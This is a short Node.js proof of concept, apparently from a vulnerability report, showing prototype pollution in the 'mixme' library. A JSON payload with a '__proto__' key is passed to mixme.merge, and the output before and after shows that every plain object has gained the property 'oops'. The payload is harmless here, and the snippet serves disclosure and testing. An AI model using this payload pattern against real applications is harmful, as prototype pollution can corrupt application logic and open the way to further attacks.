const mixme = require('mixme');
malicious_payload = '{"__proto__": {"oops": "Polluted!"}}'
console.log({}.oops)
mixme.merge(JSON.parse(malicious_payload))
console.log({}.oops)